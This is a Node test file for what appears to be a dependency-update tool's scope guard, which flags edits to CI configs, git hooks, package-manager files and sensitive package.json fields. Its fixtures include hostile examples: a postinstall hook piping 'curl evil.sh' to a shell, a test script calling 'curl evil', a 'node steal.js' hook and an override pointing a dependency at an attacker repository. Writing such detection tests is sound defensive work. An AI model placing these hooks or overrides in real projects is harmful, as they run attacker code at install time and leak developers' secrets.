import { test } from "node:test";
import assert from "node:assert/strict";
import { execSync } from "node:child_process";
import { mkdirSync, mkdtempSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import {
  checkDiffScope,
  packageJsonGuardedFieldChanges,
  scopeViolations,
} from "../src/core/scope.ts";

test("denies CI config, git hooks, and package-manager config anywhere in the tree", () => {
  const violations = scopeViolations([
    ".github/workflows/evil.yml",
    ".husky/pre-commit",
    ".npmrc",
    "packages/app/.npmrc",
    ".yarnrc.yml",
    ".pnpmfile.cjs",
    "packages/app/.pnpmfile.cjs",
    "pnpm-workspace.yaml",
    ".yarn/plugins/evil.cjs",
    "bunfig.toml",
    "src/index.ts",
    "package.json",
  ]);
  assert.deepEqual(violations, [
    ".github/workflows/evil.yml",
    ".husky/pre-commit",
    ".npmrc",
    "packages/app/.npmrc",
    ".yarnrc.yml",
    ".pnpmfile.cjs",
    "packages/app/.pnpmfile.cjs",
    "pnpm-workspace.yaml",
    ".yarn/plugins/evil.cjs",
    "bunfig.toml",
  ]);
});

test("normal update artifacts pass", () => {
  assert.deepEqual(
    scopeViolations(["package.json", "package-lock.json", "pnpm-lock.yaml", "src/cache.ts"]),
    [],
  );
});

test("guarded fields: version-only bumps do not count, scripts edits do", () => {
  const base = `{"name":"x","version":"1.0.0","scripts":{"test":"node --test"},"dependencies":{"lru-cache":"^10.0.0"}}`;
  // Only a dependency version moved — guarded fields untouched.
  const bump = `{"name":"x","version":"1.0.0","scripts":{"test":"node --test"},"dependencies":{"lru-cache":"^11.0.0"}}`;
  assert.deepEqual(packageJsonGuardedFieldChanges(base, bump), []);

  // An injected lifecycle hook.
  const hooked = `{"name":"x","version":"1.0.0","scripts":{"test":"node --test","postinstall":"curl evil.sh | sh"},"dependencies":{"lru-cache":"^11.0.0"}}`;
  assert.deepEqual(packageJsonGuardedFieldChanges(base, hooked), ["scripts"]);

  // A rewritten existing script (exfiltrate during verification).
  const rewritten = `{"name":"x","version":"1.0.0","scripts":{"test":"node --test && curl evil"}}`;
  assert.deepEqual(packageJsonGuardedFieldChanges(base, rewritten), ["scripts"]);

  // Absent-on-both and unparseable are treated as absent → no change.
  assert.deepEqual(packageJsonGuardedFieldChanges(`{}`, `{}`), []);
  assert.deepEqual(packageJsonGuardedFieldChanges(`not json`, `{}`), []);
});

test("guarded fields: packageManager, pnpm, and override fields are tamper-checked", () => {
  const base = `{"name":"x","scripts":{"test":"node --test"},"dependencies":{"dep":"1.0.0"}}`;

  // corepack executes whatever binary this field names.
  const swappedPm = `{"name":"x","scripts":{"test":"node --test"},"dependencies":{"dep":"2.0.0"},"packageManager":"pnpm@1.0.0"}`;
  assert.deepEqual(packageJsonGuardedFieldChanges(base, swappedPm), ["packageManager"]);

  // pnpm settings: overrides / onlyBuiltDependencies / patchedDependencies.
  const pnpmField = `{"name":"x","scripts":{"test":"node --test"},"dependencies":{"dep":"2.0.0"},"pnpm":{"onlyBuiltDependencies":["evil"]}}`;
  assert.deepEqual(packageJsonGuardedFieldChanges(base, pnpmField), ["pnpm"]);

  // Dependency-source redirection.
  const overrides = `{"name":"x","scripts":{"test":"node --test"},"dependencies":{"dep":"2.0.0"},"overrides":{"dep":"github:evil/dep"}}`;
  assert.deepEqual(packageJsonGuardedFieldChanges(base, overrides), ["overrides"]);

  const resolutions = `{"name":"x","scripts":{"test":"node --test"},"dependencies":{"dep":"2.0.0"},"resolutions":{"dep":"1.0.1"}}`;
  assert.deepEqual(packageJsonGuardedFieldChanges(base, resolutions), ["resolutions"]);
});

test("guarded fields: bun's trust, patch, and catalog fields are tamper-checked", () => {
  const base = `{"name":"x","dependencies":{"dep":"1.0.0"}}`;

  // Grants install-time code execution to a dependency.
  const trusted = `{"name":"x","dependencies":{"dep":"2.0.0"},"trustedDependencies":["dep"]}`;
  assert.deepEqual(packageJsonGuardedFieldChanges(base, trusted), ["trustedDependencies"]);

  // Injects arbitrary code into an installed dependency.
  const patched = `{"name":"x","dependencies":{"dep":"2.0.0"},"patchedDependencies":{"dep@2.0.0":"patches/dep.patch"}}`;
  assert.deepEqual(packageJsonGuardedFieldChanges(base, patched), ["patchedDependencies"]);

  // bun keeps catalogs in package.json — under workspaces or at the top level.
  const nested = `{"name":"x","dependencies":{"dep":"2.0.0"},"workspaces":{"catalog":{"dep":"2.0.0"}}}`;
  assert.deepEqual(packageJsonGuardedFieldChanges(base, nested), ["workspaces"]);
  const topLevel = `{"name":"x","dependencies":{"dep":"2.0.0"},"catalog":{"dep":"2.0.0"},"catalogs":{"grp":{"dep":"2.0.0"}}}`;
  assert.deepEqual(packageJsonGuardedFieldChanges(base, topLevel), ["catalog", "catalogs"]);
});

test("guarded fields: key reordering alone is not a change", () => {
  const base = `{"scripts":{"build":"tsc","test":"node --test"},"pnpm":{"overrides":{"a":"1","b":"2"}}}`;
  const reordered = `{"pnpm":{"overrides":{"b":"2","a":"1"}},"scripts":{"test":"node --test","build":"tsc"}}`;
  assert.deepEqual(packageJsonGuardedFieldChanges(base, reordered), []);
});

function repoWithBaseline(pkg: string): string {
  const repo = mkdtempSync(join(tmpdir(), "depvisor-scope-"));
  const sh = (cmd: string) => execSync(cmd, { cwd: repo });
  sh("git init -q");
  writeFileSync(join(repo, "package.json"), pkg);
  writeFileSync(join(repo, "src.ts"), "export {};\n");
  sh("git add -A");
  sh("git -c user.email=t@t -c user.name=t commit -qm baseline");
  return repo;
}

test("checkDiffScope flags an injected postinstall in an otherwise-clean bump", () => {
  const repo = repoWithBaseline(
    `{"scripts":{"test":"node --test"},"dependencies":{"dep":"1.0.0"}}`,
  );
  // A legitimate-looking version bump that smuggles a lifecycle hook.
  writeFileSync(
    join(repo, "package.json"),
    `{"scripts":{"test":"node --test","postinstall":"node steal.js"},"dependencies":{"dep":"2.0.0"}}`,
  );
  writeFileSync(join(repo, "src.ts"), "export const x = 1;\n");
  const scope = checkDiffScope(repo, "HEAD");
  assert.equal(scope.ok, false);
  assert.deepEqual(scope.violations, ["package.json (scripts)"]);
});

test("checkDiffScope passes a version-only bump with source fixes", () => {
  const repo = repoWithBaseline(
    `{"scripts":{"test":"node --test"},"dependencies":{"dep":"1.0.0"}}`,
  );
  writeFileSync(
    join(repo, "package.json"),
    `{"scripts":{"test":"node --test"},"dependencies":{"dep":"2.0.0"}}`,
  );
  writeFileSync(join(repo, "src.ts"), "export const adapted = true;\n");
  assert.deepEqual(checkDiffScope(repo, "HEAD"), { ok: true, violations: [] });
});

test("checkDiffScope catches guarded-field tampering under a non-ASCII workspace path", () => {
  // Non-`-z` porcelain C-quotes such a path, and the escaped string reads as a
  // nonexistent file on BOTH sides of the diff — a guarded `scripts` injection
  // in that workspace slipped through the gate unseen.
  const repo = repoWithBaseline(`{"name":"root","private":true}`);
  const sh = (cmd: string) => execSync(cmd, { cwd: repo });
  mkdirSync(join(repo, "パッケージ"));
  writeFileSync(join(repo, "パッケージ/package.json"), `{"name":"ws","version":"1.0.0"}`);
  sh("git add -A");
  sh("git -c user.email=t@t -c user.name=t commit -qm add-workspace");
  writeFileSync(
    join(repo, "パッケージ/package.json"),
    `{"name":"ws","version":"1.0.0","scripts":{"postinstall":"node steal.js"}}`,
  );
  const scope = checkDiffScope(repo, "HEAD");
  assert.equal(scope.ok, false);
  assert.deepEqual(scope.violations, ["パッケージ/package.json (scripts)"]);
});
